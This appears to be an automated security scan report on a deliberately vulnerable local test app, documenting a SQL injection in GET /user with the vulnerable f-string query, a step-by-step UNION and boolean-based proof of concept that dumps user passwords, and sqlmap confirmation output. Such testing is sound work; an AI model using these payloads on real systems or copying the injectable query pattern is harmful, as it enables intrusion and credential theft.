# Security scan — test-vuln-app

- target: `http://127.0.0.1:8099` (local)
- isolation: direct — no Tor for local targets (Arti has no loopback route)
- strix: gemini-flash-lite · 0s · run /opt/ares/strix/strix_runs/test-vuln-app-final_33ac
- started 2026-11-07T03:09:36Z · duration 22s

## Findings

### [HIGH] SQL Injection in GET /user id parameter (unauthenticated, full table extraction)

The `id` query parameter of `GET /user` is interpolated directly into an SQL string via an f-string and executed with `cursor.execute(f"SELECT * FROM users WHERE id = {uid}")`. Any unauthenticated client can inject arbitrary SQL, demonstrated by UNION-based extraction of the entire `users` table including password hashes/columns, plus boolean-based and error-based confirmation.

Agent PoC:

1. Start the app locally (`python3 app.py`, binds 127.0.0.1:5000) with a seeded `test.db` containing a `users(id, name, email, password)` table.
2. Baseline: `GET /user?id=1` returns the row for id 1.
3. Determine column count with `GET /user?id=1 ORDER BY 5` (500 error) vs ORDER BY 1-4 (200) → 4 columns.
4. Extract schema: `GET /user?id=1 UNION SELECT 1,sql,3,4 FROM sqlite_master`.
5. Dump all rows: `GET /user?id=-1 UNION SELECT id,name,email,password FROM users` → all users including admin password returned.
6. Boolean confirmation: `GET /user?id=1 AND 1=1` returns a row; `id=1 AND 1=2` returns `[]`.

## Independent confirmation

- sqlmap: `{"url": "http://127.0.0.1:8099/user?id=1", "injectable": true, "rc": 0, "dbms": "SQLite", "techniques": ["UNION query", "boolean-based blind"], "dump_rc": 0, "dump_rows": 2, "sensitive_exposed": true, "sample": ["|_ -| . [']     | .'| . |", "|___|_  [\"]_|_|_|__,|  _|", "| id | secret             | username |", "| 1  | flag{super_secret} | admin    |"]}`
- sstimap: `{"vulnerable": false}`
- xsstrike: `{"vectors": 0}`
- nmap: `{}`
- ffuf: paths=None
- nuclei: hits=None
- metasploit: `{"server": null, "module": null, "rc": 0}`
